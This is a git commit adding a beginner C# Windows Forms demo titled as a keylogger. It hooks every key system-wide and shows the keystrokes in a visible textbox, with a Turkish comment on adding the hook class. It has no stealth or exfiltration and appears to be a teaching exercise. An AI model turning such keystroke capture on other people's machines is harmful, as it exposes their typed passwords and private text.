ed25521a658a11e2ee44e540ec6bebe1a06a9ed0
Muhcim <34978284+Muhcim@users.noreply.github.com>
2018-02-03 01:13:08 +0300

    Keylogger Atmak

---
+++ KeyLogger Atmak/Class1.cs
@@ -0,0 +1,12 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace KeyLogger_Atmak
+{
+    class Class1
+    {
+    }
+}
---
+++ KeyLogger Atmak/Form1.cs
@@ -0,0 +1,47 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace KeyLogger_Atmak
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        GlobalKeyboardHook gHook;
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            gHook = new GlobalKeyboardHook();
+            gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
+            foreach (Keys key in Enum.GetValues(typeof(Keys)))
+                gHook.HookedKeys.Add(key);
+           
+        }
+        public void gHook_KeyDown(object sender, KeyEventArgs e)
+        {
+            textBox1.Text += ((char)e.KeyValue).ToString();
+
+
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            gHook.hook();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            gHook.unhook();
+        }
+    }
+}
+//İlk önce GlobalKeyboardHook isimli dışarıdan aldığımız referansımızı Yani Class'ımızı ekliyoruz SolutionExploper bölümünden Dersin üzerinde sağ tuş yaparak add/ exitinıtem diyerek ekliyoruz
